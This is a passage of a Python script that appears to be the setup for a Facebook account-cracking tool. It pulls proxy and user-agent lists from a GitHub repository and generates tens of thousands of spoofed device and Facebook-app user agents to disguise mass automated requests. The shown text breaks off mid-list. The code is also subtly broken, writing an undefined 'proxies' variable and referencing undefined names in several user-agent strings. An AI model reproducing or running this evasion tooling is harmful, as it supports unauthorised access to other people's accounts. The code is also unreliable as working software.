fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python trt.py')
	


try:
	prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;92m[√] LOADING PLZ WAIT...')
	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
aqib_ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 13; Lenovo TB128FU Build/TKQ1.221220.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g32 Build/S2SN32.34-72-31)","Dalvik/2.1.0 (Linux; U; Android 10; PLAY NOW TV BOX 3 Build/QT)","Dalvik/2.1.0 (Linux; U; Android 11; 220333QNY Build/RKQ1.211001.001) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; SM-G980F Build/TP1A.220624.014) VD/236","Dalvik/2.1.0 (Linux; U; Android 10; M2006C3LVG MIUI/V12.0.18.0.QCDEUXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; M2006C3MII Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; 8082 Build/O11019) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 7.1.2; XPL 3000 Build/V002S901_20181121)","Dalvik/2.1.0 (Linux; U; Android 12; SN304AE Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH22 Build/QTG3.200305.006.S312)","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G Build/RPNS31.Q1-51-40-16-29)","Dalvik/2.1.0 (Linux; U; Android 10; ART-AL00x Build/HUAWEIART-AL00x)","Dalvik/2.1.0 (Linux; U; Android 12; QUAD-CORE A133 b3 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; motorola razr 40 ultra Build/T1TZ33.3-62-39)","Dalvik/2.1.0 (Linux; U; Android 11; Grundig Android UHD TV Build/RTM6.230109.085)","Dalvik/2.1.0 (Linux; U; Android 11; A60 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10; LongTV_GN7501E Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G960U Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G960F Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; M2006C3LG Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J610FN Build/M1AJQ) VD/235","Dalvik/2.1.0 (Linux; U; Android 11; SM-A022G Build/RP1A.200720.012) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; 22011119UY Build/RP1A.200720.011) VD/236","Dalvik/2.1.0 (Linux; U; Android 13; SM-A336E Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; ANY-NX1 Build/HONORANY-N21)","Dalvik/2.1.0 (Linux; U; Android 9; AEOHY Build/PS7559.3534N)","Dalvik/2.1.0 (Linux; U; Android 11; 2K SMART TV Build/RTM5.220609.163)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; HW-SCL-L32 Build/HW-SCL-L32)","Dalvik/2.1.0 (Linux; U; Android 12; C10 Build/SQ1A.220105.002)","Dalvik/2.1.0 (Linux; U; Android 12; VNA-LX3 Build/HONORVNA-LX3)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; SUGAR C11 Build/N2G47H)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-4-6)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 30 ultra Build/T1SQ33.15-11-137-10)","Dalvik/2.1.0 (Linux; U; Android 12; motorola one 5G UW ace Build/S3RVS32.128-36-4-4)","Dalvik/2.1.0 (Linux; U; Android 12; Model T1 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; LAVIE T8 8HD1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; Tab 5 Build/SD1A.210817.036.A8)","Dalvik/2.1.0 (Linux; U; Android 13; V2247 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; 2201117SI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; 21061119DG Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; 9080G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; 21081111RG Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A145R Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; CPH2083 Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; FNE-NX9 Build/HONORFNE-N29) AppleWebKit [PB/111]","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Pro Build/TQ3A.230705.001) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; LIFETAB E1080X Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH2 Build/QTG3.200305.006.S312)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G781V Build/TP1A.220624.014) VD/236","Dalvik/2.1.0 (Linux; U; Android 12; F101 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; 702SH Build/S0027)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT72 Build/64.1.A.0.929)","Dalvik/2.1.0 (Linux; U; Android 13; moto g 5G (2022) Build/T1SAS33.73-40-3)","Dalvik/2.1.0 (Linux; U; Android 12; TB310XU Build/SP1A.210812.016)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; HMT400 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 9; CMCC Pad1 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-51)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook R13  (CB5-312T)Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Pro MIUI/V11.0.5.0.PGGEUXM) AppleWebKit [PB/111]","Dalvik/2.1.0 (Linux; U; Android 9; G8441 Build/47.2.A.11.228) AppleWebKit [PB/111]","Dalvik/2.1.0 (Linux; U; Android 13; RMX3393 Build/TP1A.220905.001) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; 5031G Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; BV9300 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; moto g23 Build/THA33.31-12)","Dalvik/2.1.0 (Linux; U; Android 13; PEDM00 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 13; Mi 10 Pro Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 11; PRO 1600E 4G RS1248PL Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G (2022) Build/S1SDS32.56-64-12)","Dalvik/2.1.0 (Linux; U; Android 11; S96_MATE Build/RQ2A.210505.003)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 10; TabPro Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; IN2023 Build/RP1A.201005.001) ;IN2023","Dalvik/2.1.0 (Linux; U; Android 11; W-V750BN-EEA Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; M2101K7AG Build/RKQ1.201022.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X505F Build/QKQ1.191224.003) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; ok 2K TV Build/RTM4.220307.154)","Dalvik/2.1.0 (Linux; U; Android 12; 2201117TY Build/SKQ1.211103.001) VD/236","Dalvik/2.1.0 (Linux; U; Android 10; SKWHP40A-ZWL Build/QTT8.201201.004)","Dalvik/2.1.0 (Linux; U; Android 11; 8LB1 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; AQUOS-TVX18 Build/OTT1.180130.001)","Dalvik/1.4.0 (Linux; U; Android 2.3.3; GT-I9000B Build/GINGERBREAD)","Dalvik/2.1.0 (Linux; U; Android 12; Nokia C02 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G1600 Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 10; KM1069 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BE72 Build/61.2.F.0.211)","Dalvik/2.1.0 (Linux; U; Android 10; Stream Build/QT)","Dalvik/2.1.0 (Linux; U; Android 13; 2107113SR Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230705.001)","Dalvik/2.1.0 (Linux; U; Android 12; S100Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; CASPER_VIA_G1_Plus Build/OPM1.171019.019)","Dalvik/2.1.0 (Linux; U; Android 13; V2247 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TNS33.14-63-4-2)","Dalvik/2.1.0 (Linux; U; Android 11; trogdor Build/R114-15437.61.0)","Dalvik/2.1.0 (Linux; U; Android 11; W-K610-SUI Build/RP1A.200720.011)","Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2246};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]","[FBAN/FB4A;FBAV/74.0.0.2457;FBBV/2447900;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097175;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/H2O;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SGH-I337;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]","Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]","Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]","Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"])
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/'+fban+'FB4A;FBAV/;FBBV/'+fbbv+'[FBAN/FB4A;FBAV/313.0.0.35.119;FBBV/282997860;FBDM/*{density=3.0,width=1080,height=2352};FBLC/en_US;FBRV/284651440;FBCR/Vi_India;FBMF/Micromax;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/'+fbdv+'IN1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    #ua = random.choice(["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v16005574129 t9093743756447876996 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7724460904453889298 t1149961279716100549 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v2735601186822687586 t2818120325001311098 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v830950139510699466 t860862242214111558 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5073946121 t4969878276061334900 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v1923309165423468843 t13073140279358520 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v3584660920655761844 t6172261621349901359 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v7854007019448038570 t9153810266204246498 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v16005650307 t9093743756447876996 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v6475735074446228360 t2818120325001311098 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v6541066470673310636 t4858138105369423375 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v155920186321073231 t9161102990469579992 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v8893243436398372982 t4520301449659322587 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v16005701241 t9093743756447876996 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5073969997 t4969878276061334900 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v2638005535149414743 t1149961279716100549 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v3157828488688230289 t2818120325001311098 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v1136185732792504108 t860862242214111558 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 RuxitSynthetic/1.0 v6036859450840589383 t3318757319431557243 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4298481957922542403 t8172372023216239280 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5271717342197602332 t1144382048624470428 ath93eb305d altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v16005777413 t9093743756447876996 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v5073993848 t4969878276061334900 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 RuxitSynthetic/1.0 v953999963902110250 t2818120325001311098 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 RuxitSynthetic/1.0 v4173765277485377057 t4858138105369423375 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9194248537766555126 t4519107958258468295 ath4b3726d5 altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v8592382556613088947 t4340622329842383445 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v8596670450354874994 t4502131850750304925 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 RuxitSynthetic/1.0 v16005828345 t9093743756447876996 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v400362978554886869 t13073140279358520 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 